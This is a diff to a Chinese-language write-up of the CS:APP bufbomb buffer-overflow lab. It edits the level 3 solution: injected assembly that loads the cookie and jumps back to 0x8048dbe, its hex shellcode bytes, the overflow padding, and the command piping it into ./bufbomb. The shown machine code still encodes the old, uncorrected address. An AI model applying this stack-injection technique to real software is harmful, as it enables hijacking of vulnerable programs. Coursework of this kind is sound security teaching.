@@ -449,13 +449,17 @@ cat level2.txt|./hex2raw|./bufbomb -u h
 //可以直接读汇编代码得到 是0x8048dbe
 
 //需要注入的代码如下
-mov 0x2804d108,%eax
+//在level2的bang函数中已经得知cookie值存放的地址是0x804d108
+mov 0x0804d108,%eax
+//上面这一行改成 mov $0x20083f2f,%eax 也行
 push $0x8048dbe
 ret
 //翻译为16进制数
 8b 04 25 08 d1 04 28
 68 be 8d 04 08
 c3
+
+
 /*
 顺便一提，汇编代码最后要留一行空行
 gcc -c将此处汇编代码转换成机器码不能在mac上进行
@@ -482,7 +486,7 @@ c3
 00 00 00 00 00 00 00 00
 00 00 00 10 36 68 55
 b8 35 68 55
-
+//13+31+4 = 48 
 cat level3.txt|./hex2raw|./bufbomb -u h
 ```
 ## <div id="level4">10.Level 4:Nitroglycerin(10 pts)</div>
